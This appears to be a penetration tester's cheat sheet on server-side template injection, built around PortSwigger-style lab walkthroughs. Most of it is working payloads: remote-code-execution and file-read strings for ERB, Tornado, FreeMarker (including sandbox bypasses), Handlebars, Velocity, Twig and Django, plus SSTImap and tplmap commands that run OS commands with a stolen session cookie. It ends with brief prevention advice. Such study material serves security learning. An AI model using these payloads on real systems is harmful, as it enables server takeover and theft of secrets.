---
description: Server Side Template Injection
---

# SSTI

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2" %}

{% embed url="https://github.com/DiogoMRSilva/websitesVulnerableToSSTI" %}

{% hint style="info" %}
Try to find any field that is shown/reflected on the response and try to alter it with injection.
{% endhint %}

## What is server-side template injection?

Server-side template injection is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side.

This allows attackers to inject arbitrary template directives in order to manipulate the template engine, often enabling them to take complete control of the server.

## What is the impact of server-side template injection?

At the severe end of the scale, an attacker can potentially achieve RCE.

Even when RCE is not possible, attacker could read sensitive files on the server.

## How do server-side template injection vulnerabilities arise?

{% code overflow="wrap" fullWidth="true" %}
```sh
when user input is concatenated into templates rather than being passed in as data. 
# Passed as data -> NOT VULNERABLE
$output = $twig->render("Dear {first_name},", array("first_name" => $user.first_name) );
# Users can customize their name -> directly concatenate user input into templates prior to rendering -> VULNERABLE
$output = $twig->render("Dear " . $_GET['name']);
# this potentially allows an attacker to place a server-side template injection payload inside the name parameter:
http://vulnerable-website.com/?name={{bad-stuff-here}}
Vulns like this are sometimes caused by accident due to poor template design
```
{% endcode %}

## Constructing a server-side template injection attack

<figure><img src="../../.gitbook/assets/image (153).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" fullWidth="true" %}
```sh
##################################### DETECT
Find parameters that are reflected on the response and that we could alter
# Try fuzzing the template by injecting a sequence of special characters commonly used in template expressions:
${{<%[%'"}}%\																											'
####### Plaintext context
# Most template languages allow you to freely input content either by using HTML tags directly or by using \
# the template's native syntax, which will be rendered to HTML on the back-end before the HTTP response is sent
In Freemarker, the line render('Hello ' + username) would render to something like Hello Carlos. 
# Test SSTI by setting mathematical operations as the value of the parameter.
#  For example, consider a template that contains the following vulnerable code:
render('Hello ' + username)
#  During auditing, we might test for server-side template injection by requesting a URL such as:
http://vulnerable-website.com/?username=${7*7}
# If the resulting output contains Hello 49 -> operation evaluated server-side -> good SSTI PoC
######## Code context
# Vuln exposed by user input being placed within a template expression:
greeting = getQueryParameter('greeting')
engine.render("Hello {{"+greeting+"}}", data)
#  On the website, the resulting URL would be something like:
http://vulnerable-website.com/?greeting=data.username
#  This would be rendered in the output to Hello Carlos, for example. 
# This context is easily missed so first establish that param has not XSS by injecting arbitrary HTML into the value:
http://vulnerable-website.com/?greeting=data.username<tag>
# In the absence of XSS -> blank entry in the output (just Hello with no username), encoded tags, or an error message.
# Next step -> break out of the statement using common templating syntax and attempt to inject arbitrary HTML after it:
http://vulnerable-website.com/?greeting=data.username}}<tag>
# If error or blank output -> wrong template syntax or SSTI not possible / if successful payload -> SSTI present:
Hello Carlos<tag>


################################## IDENTIFY
Identify the template engine -> submit invalid syntax and the error message will tell what the template engine is
# For example, the invalid expression <%=foobar%> triggers the following response from the Ruby-based ERB engine:
(erb):1:in `<main>': undefined local variable or method `foobar' for main:Object (NameError)
from /usr/lib/ruby/2.5.0/erb.rb:876:in `eval'
from /usr/lib/ruby/2.5.0/erb.rb:876:in `result'
from -e:4:in `<main>'																												'
# Otherwise, you'll need to manually test different language-specific payloads and study how they are interpreted


https://github.com/vladko312/SSTImap
python /opt/SSTImap/sstimap.py --engine erb -u https://TARGET.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock --os-cmd "cat /home/carlos/secret"
python /opt/SSTImap/sstimap.py -u https://TARGET.net/product/template?productId=1 --cookie 'session=StolenUserCookie' --method POST --marker fuzzer --data 'csrf=ValidCSRFToken&template=fuzzer&template-action=preview' --engine Freemarker --os-cmd 'cat /home/carlos/secret'

# SSTI payloads to manually identify vulnerability.
${{<%[%'"}}%\.,
}}{{7*7}} 
user.name}}{%25+import+os+%25}{{os.system('cat%20/home/carlos/secret')

{{fuzzer}}
${fuzzer}
${{fuzzer}}

${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
${foobar}

{% raw %}
{% debug %}
{% endraw %}
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
## Be aware some payloads return a successful response in more than one template language -> keep testing the chart
{% endhint %}

## Exploiting server-side template injection vulnerabilities

Once you discover SSTI and identify the template engine being used, successful exploitation typically involves the following process.

<pre class="language-sh" data-overflow="wrap" data-full-width="true"><code class="lang-sh">############################################ READ
Read the template engine documentation.

#### Learn the basic template syntax
# For example, once you know that the Python-based Mako template engine is being used -> achieve RCE this way:
&#x3C;%
                import os
                x=os.popen('id').read()
                %>
                ${x}
# EXAMPLE:  Basic server-side template injection
- Identify a request that allow parameters that are reflected (seen) on the response to inject SSTI 
- Try /?message=&#x3C;%=foobar%> to find an error which discloses ERB template engine
- Research how to execute commands --> &#x3C;%= system('cat /etc/passwd') %>
# EXAMPLE: Basic server-side template injection (code context)
- Identify requests with parameters. One is blog-post-author-display=user.name
- We can select different options, and those are reflected in our name when we post a comment
- After we try blog-post-author-display=${{&#x3C;%[%'"}}%\    'and then we post a comment, we get this error:
No handlers could be found for logger "tornado.application" Traceback (most recent call last): File "&#x3C;string>", line 15, in &#x3C;module> File "/usr/local/lib/python2.7/dist-packages/tornado/template.py", line 317, in __init__ "exec", dont_inherit=True) File "&#x3C;string>.generated.py", line 4 _tt_tmp = ${{&#x3C;%[%'" # &#x3C;string>:1 ^ SyntaxError: invalid syntax'
- Now we know the template engine is Tornado. Research how to execute code
{%import os%}{{os.system('whoami')}}
- Try user.name}}&#x3C;tag> to see reflected as Peter Wiener&#x3C;tag>}} 
- We try to break the template syntax -> user.name}}{{2*2}} renders to Peter Wiener4}}
- Now we try RCE and URL encode the payload -> user.name}}{%25import+os%25}{{os.system('whoami')}} gives us carlos user

#### Read about the security implications
Docu may provide a "Security" section of what to avoid using the template -> invaluable resource as cheatsheet
Even w/o "Security" section, if a particular object/function can pose a security risk -> warning on the docu -> research
# For example, in ERB, the docu reveals that you can list all directories and then read arbitrary files as follows: 
&#x3C;%= Dir.entries('/') %>
&#x3C;%= File.open('/example/arbitrary-file').read %>
# EXAMPLE: Server-side template injection using documentation
- Identify parameters that are reflected (seen) on the response to inject SSTI 
- Use ${7*7} to see the math expression is evaluated
- Use ${foobar} to find an error and find Freemaker is the template engine
- Research on the FAQ -> look for "security" ->  Can I allow users to upload templates and what are the security implications? 
- Find there about the new() built-in -> use to create a variable of a certain TemplateModel implementation.
- Research about TemplateModel FreeMarker to find API docs
https://freemarker.apache.org/docs/api/freemarker/template/TemplateModel.html
- There we see Execute method -> research here https://portswigger.net/research/server-side-template-injection
- how to execute code --> ${"freemarker.template.utility.Execute"?new()("id")}

#### Look for known exploits
Once you identify the template engine -> browse the web for any vulns that others may have already discovered.
# EXAMPLE: Server-side template injection in an unknown language with a documented exploit
- Find requests with parameters.
- Fuzz them with ${{&#x3C;%[%'"}}%\                                                                                           '
- Find that /?message=${{&#x3C;%[%'"}}%\    'gives an error and discloses Handlebars template engine
- Research basic injection 
https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/JavaScript/#handlebars-basic-injection
- Put it together and URL encode it:
/?message={{%23with+"s"+as+|string|}}++{{%23with+"e"}}++++{{%23with+split+as+|conslist|}}++++++{{this.pop}}++++++{{this.push+(lookup+string.sub+"constructor")}}++++++{{this.pop}}++++++{{%23with+string.split+as+|codelist|}}++++++++{{this.pop}}++++++++{{this.push+"return+require('child_process').execSync('ls+-la')%3b"}}++++++++{{this.pop}}++++++++{{%23each+conslist}}++++++++++{{%23with+(string.sub.apply+0+codelist)}}++++++++++++{{this}}++++++++++{{/with}}++++++++{{/each}}++++++{{/with}}++++{{/with}}++{{/with}}{{/with}}


'########################################## EXPLORE
If no workable exploit -> explore the environment and try to discover all the objects to which you have access. 
Many template engines expose a "self" or "environment" object of some kind, which acts like a namespace containing all
# For example, in Java-based templating languages, you can sometimes list all variables in the env:
${T(java.lang.System).getenv()}
# This can form the basis for creating a shortlist of potentially interesting objects and methods to investigate further. 

#### Developer-supplied objects
Websites contain both built-in objects provided by the template and custom, site-specific objects that have been
supplied by the web developer. Pay attention to these non-standard objects because they are especially likely 
to contain sensitive information or exploitable methods. 
As these objects can vary between different templates within the same website, be aware that you might need 
to study an object behavior in the context of each distinct template before you find a way to exploit it.
# If RCE cannot be achieved -> try other high-severity exploits, stuch as path traversal, to access sensitive data
# EXAMPLE: Server-side template injection with information disclosure via user-supplied objects
- Identify parameters that are reflected (seen) on the response to inject SSTI 
- Fuzz with ${{&#x3C;%[%'"}}%\    'to disclose an error and find Django template engine
- Debug information leak -> {% debug %} -> find the object "settings"
- Read docu about settings and task about secret key
https://docs.djangoproject.com/en/5.1/ref/settings/#std-setting-SECRET_KEY
- Retrieve it using {{settings.SECRET_KEY}}


<strong>'########################################### CREATE A CUSTOM ATTACK
</strong>If template engine executes templates inside a sandbox -> exploitation is difficult or imposible
After identifying the attack surface -> review each function/method for exploitable behavior -> build a custom attack

#### Constructing a custom exploit using an object chain
Identify objects and methods to which you have access. Some of the objects may immediately jump out as interesting. 
By combining own knowledge and info from docu -> put together a shortlist of objects to investigate further 
Docu -> pay particular attention to which methods these objects grant access to, as well as which objects they return
You can discover combinations of objects and methods that you can chain together to gain access to dangerous functions
# Example: Velocity -> access to a ClassTool object called $class. Studying the docu -> chain the $class.inspect() 
# method and $class.type property to obtain references to arbitrary objects. To exploit it and get RCE:
$class.inspect("java.lang.Runtime").type.getRuntime().exec("bad-stuff-here")
# EXAMPLE: Server-side template injection in a sandboxed environment
- Find reflected parameter, try different ${} such as ${7*7}
- When trying ${foo} -> error disclosing FreeMarker template engine
- Researching, I found a way to read files on PayloadsAllTheThings
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join(" ")}
- Another option for sandbox bypass (article has to be changed for the object name, in our case, "product"
&#x3C;#assign classloader=article.class.protectionDomain.classLoader>
&#x3C;#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
&#x3C;#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
&#x3C;#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}

#### Constructing a custom exploit using developer-supplied objects
Some template engines run in a secure, locked-down environment by default in order to mitigate risks, but
developer-created objects that are exposed to the template can offer a further, less battle-hardened attack surface.
Site-specific objects are almost certainly not documented at all. Steps: 
1. Investigate the website's behavior manually to identify the attack surface.
2. Construct your own custom exploit accordingly. 

${{&#x3C;%[%'"}}%\ -> Twig PHP
{7*7} -> error
7*7 -> 49
7*7}}&#x3C;tag> -> 49&#x3C;tag>}}
7*7}}{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}} -> not fails but no output
{{_self}} -> index
{{['id',""]|sort('system')}} -> array
</code></pre>

## Vulnerable Source Code

If we see sth like **render\_template\_string** function, it might be vulnerable

## Automatic exploitation

```sh
https://github.com/epinna/tplmap
GET  -> tplmap -u <url>/?<vulnparam>
POST -> tplmap -u <url> -d '<vulnparam>'
tplmap -u <url> -d '<vulnparam>' --os-cmd 'id'
```

## How to prevent server-side template injection vulnerabilities

* Not allow any users to modify or submit new templates.
* Use a "logic-less" template engine, such as Mustache. Separating the logic from presentation as much as possible can greatly reduce your exposure.
* Only execute users' code in a sandboxed environment.
* Accept that arbitrary code execution is all but inevitable and apply your own sandboxing by deploying your template environment in a locked-down Docker container, for example.
